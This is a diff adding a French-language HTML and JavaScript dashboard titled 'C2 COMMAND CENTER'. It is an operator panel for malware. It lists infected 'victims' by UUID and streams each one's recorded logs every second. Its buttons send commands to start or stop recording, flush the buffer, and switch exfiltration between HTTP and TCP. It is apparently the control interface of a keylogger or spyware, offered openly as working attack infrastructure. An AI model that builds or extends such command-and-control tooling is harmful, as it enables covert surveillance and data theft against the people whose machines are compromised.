@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 COMMAND CENTER</title>
+    <style>
+        /* --- STYLE HACKER / DARK MODE --- */
+        body { 
+            background-color: #0d1117; 
+            color: #58a6ff; 
+            font-family: 'Consolas', 'Courier New', monospace; 
+            padding: 20px; 
+            margin: 0;
+        }
+        
+        h1 { 
+            border-bottom: 1px solid #30363d; 
+            padding-bottom: 10px; 
+            color: #f0f6fc;
+        }
+        
+        .container { 
+            display: flex; 
+            gap: 20px; 
+            height: 85vh; 
+        }
+        
+        /* BARRE LATERALE (LISTE VICTIMES) */
+        .sidebar { 
+            width: 25%; 
+            border: 1px solid #30363d; 
+            background: #161b22; 
+            padding: 10px; 
+            overflow-y: auto; 
+        }
+        
+        .victim-item { 
+            padding: 10px; 
+            margin-bottom: 5px; 
+            cursor: pointer; 
+            border: 1px solid transparent; 
+            color: #c9d1d9;
+        }
+        
+        .victim-item:hover { 
+            background: #21262d; 
+            border-color: #8b949e; 
+        }
+        
+        .victim-item.active { 
+            background: #1f6feb; 
+            color: white; 
+            font-weight: bold; 
+        }
+
+        /* ZONE PRINCIPALE (LOGS + CONTROLES) */
+        .main { 
+            width: 75%; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        
+        h2 { 
+            margin-top: 0; 
+            color: #8b949e; 
+            font-size: 1.2em; 
+        }
+
+        /* BOUTONS DE COMMANDE */
+        .controls { 
+            display: none; /* Caché tant qu'aucune victime n'est sélectionnée */
+            margin-bottom: 15px; 
+            background: #161b22; 
+            padding: 10px; 
+            border: 1px solid #30363d; 
+        }
+        
+        button { 
+            padding: 8px 15px; 
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            font-weight: bold; 
+            font-family: inherit; 
+            margin-right: 5px; 
+            margin-bottom: 5px;
+            border-radius: 4px;
+        }
+        
+        /* COULEURS DES BOUTONS */
+        .btn-start { background: #238636; }      /* Vert */
+        .btn-start:hover { background: #2ea043; }
+        
+        .btn-stop { background: #da3633; }       /* Rouge */
+        .btn-stop:hover { background: #f85149; }
+        
+        .btn-flush { background: #d29922; color: #0d1117; } /* Orange/Jaune */
+        .btn-flush:hover { background: #e3b341; }
+        
+        .btn-mode { background: #6e7681; }       /* Gris */
+        .btn-mode:hover { background: #8b949e; }
+        
+        .btn-refresh { background: #1f6feb; float: right; } /* Bleu */
+
+        /* ZONE D'AFFICHAGE DES LOGS */
+        #logs { 
+            flex-grow: 1; 
+            background: #000; 
+            border: 1px solid #30363d; 
+            padding: 15px; 
+            overflow-y: scroll; 
+            white-space: pre-wrap; /* Garde les sauts de ligne */
+            font-size: 14px; 
+            color: #3fb950; /* Texte vert style terminal */
+            box-shadow: inset 0 0 10px #000;
+        }
+    </style>
+</head>
+<body>
+
+    <h1> C2 CONTROL PANEL (Dashboard)</h1>
+
+    <div class="container">
+        <div class="sidebar">
+            <h3 style="margin-top:0; color:#8b949e;">CIBLES ACTIVES</h3>
+            <div id="victim-list">Recherche...</div>
+        </div>
+
+        <div class="main">
+            <h2 id="victim-title">◀ Sélectionnez une cible pour commencer</h2>
+
+            <div class="controls" id="controls">
+                <button onclick="sendCommand('start')" class="btn-start">▶ START REC</button>
+                <button onclick="sendCommand('stop')" class="btn-stop">⏹ STOP REC</button>
+                
+                <button onclick="sendCommand('flush')" class="btn-flush">🗑 VIDER BUFFER</button>
+                <button onclick="sendCommand('switch_http')" class="btn-mode">🌐 MODE HTTP</button>
+                <button onclick="sendCommand('switch_tcp')" class="btn-mode">🔌 MODE TCP</button>
+                
+                <button onclick="refreshLogs()" class="btn-refresh">↻ REFRESH</button>
+            </div>
+
+            <div id="logs">En attente de connexion...</div>
+        </div>
+    </div>
+
+    <script>
+        let currentUUID = null;
+
+        // 1. Récupère la liste des fichiers .log sur le serveur
+        async function loadVictims() {
+            try {
+                let res = await fetch('/api/victims');
+                let data = await res.json();
+                let html = "";
+                
+                if (data.length === 0) {
+                    html = "<div style='padding:10px; color:#8b949e;'>Aucune victime...</div>";
+                } else {
+                    data.forEach(v => {
+                        // Ajoute la classe 'active' si c'est la victime en cours
+                        let activeClass = (v === currentUUID) ? "active" : "";
+                        html += `<div class="victim-item ${activeClass}" onclick="selectVictim('${v}')">🖥️ ${v}</div>`;
+                    });
+                }
+                document.getElementById('victim-list').innerHTML = html;
+            } catch (e) {
+                console.error("Erreur connexion API Victims", e);
+            }
+        }
+
+        // 2. Sélectionne une victime (Click)
+        function selectVictim(uuid) {
+            currentUUID = uuid;
+            document.getElementById('victim-title').innerText = "CIBLE ACTUELLE : " + uuid;
+            document.getElementById('controls').style.display = 'block'; // Affiche les boutons
+            
+            // Rafraîchissement visuel immédiat de la liste pour mettre le bleu sur la bonne case
+            loadVictims();
+            refreshLogs();
+        }
+
+        // 3. Récupère le contenu du fichier log
+        async function refreshLogs() {
+            if(!currentUUID) return;
+            try {
+                let res = await fetch('/api/logs/' + currentUUID);
+                let data = await res.json();
+                let logBox = document.getElementById('logs');
+                
+                // On met à jour le texte seulement si ça a changé pour éviter de clignoter
+                if (logBox.innerText !== data.logs) {
+                    logBox.innerText = data.logs || " [LOG VIDE] ";
+                    logBox.scrollTop = logBox.scrollHeight; // Scroll automatique vers le bas
+                }
+            } catch (e) {
+                console.log("Erreur logs", e);
+            }
+        }
+
+        // 4. Envoie une commande au serveur
+        async function sendCommand(cmd) {
+            if(!currentUUID) return;
+            try {
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({uuid: currentUUID, command: cmd})
+                });
+                
+                // Petit feedback visuel
+                let logBox = document.getElementById('logs');
+                logBox.innerText += `\n\n[ADMIN] >> COMMANDE ENVOYÉE : ${cmd.toUpperCase()} ...\n`;
+                logBox.scrollTop = logBox.scrollHeight;
+                
+            } catch (e) {
+                alert("Erreur lors de l'envoi de la commande !");
+            }
+        }
+        
+        // --- AUTO REFRESH (TEMPS REEL) ---
+        loadVictims();
+        setInterval(loadVictims, 3000);   // Met à jour la liste des victimes toutes les 3s
+        setInterval(refreshLogs, 1000);   // Met à jour le texte toutes les secondes
+    </script>
+</body>
+</html>
